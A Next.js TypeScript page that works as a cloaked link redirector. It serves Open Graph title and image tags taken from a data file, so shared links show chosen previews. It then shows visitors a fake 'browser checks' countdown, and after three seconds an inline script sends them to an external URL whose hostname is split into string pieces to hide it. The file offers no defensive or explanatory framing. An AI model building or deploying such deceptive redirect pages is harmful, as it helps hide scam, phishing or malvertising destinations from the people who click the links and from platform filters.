import fs from "fs";
import path from "path";
import { GetServerSideProps } from "next";

type DataItem = {
  id: string;
  title: string;
  image: string;
  key: string;
};

export const getServerSideProps: GetServerSideProps<{ item: DataItem }> = async (context) => {
  const { id } = context.params!;
  const filePath = path.join(process.cwd(), "public", "data.json");
  const jsonData = fs.readFileSync(filePath, "utf-8");
  const data: DataItem[] = JSON.parse(jsonData);

  const item = data.find(x => x.id === id);
  if (!item) return { notFound: true };

  return { props: { item } };
};

export default function RedirectPage({ item }: { item: DataItem }) {
  const key = item.key;

  return (
    <>
      <head>
        <title>{item.title}</title>
        <meta name="description" content="" />
        <meta property="og:locale" content="en_GB" />
        <meta property="og:type" content="website" />
        <meta property="og:url" content={`https://{YOUR_DOMAIN}.vercel.app/${item.id}`} />
        <meta property="og:title" content={item.title} />
        <meta property="og:image" content={item.image} />
      </head>

      <body style={{
        textAlign: "center",
        display: "flex",
        flexDirection: "column",
        justifyContent: "center",
        minHeight: "100vh",
        fontFamily: '"LXGW Marker Gothic", sans-serif'
      }}>
        <div className="content">
          <h1>Please wait one moment!</h1>
          <h2 id="number">3</h2>
          <p>We need to carry out some browser checks, please wait 3 seconds..</p>
          <p>Thank you for your patience!</p>
        </div>
        <footer>
          <input type="hidden" id="loc" value={key} />
        </footer>

        <script
          dangerouslySetInnerHTML={{
            __html: `
              setInterval(function(){
                var numberElem = document.getElementById("number");
                var number = parseInt(numberElem.innerHTML, 10);
                var url1 = 'signingunwilling';
                var url2 = '.com';
                var url3 = '/haba8g98r5';
                if (number > 0) {
                  number--;
                  numberElem.innerHTML = number;
                }
                if (number === 0) {
                  window.location.replace('https://' + url1 + url2 + url3 + '?key=${key}');
                }
              }, 1000);
            `,
          }}
        />
      </body>
    </>
  );
}
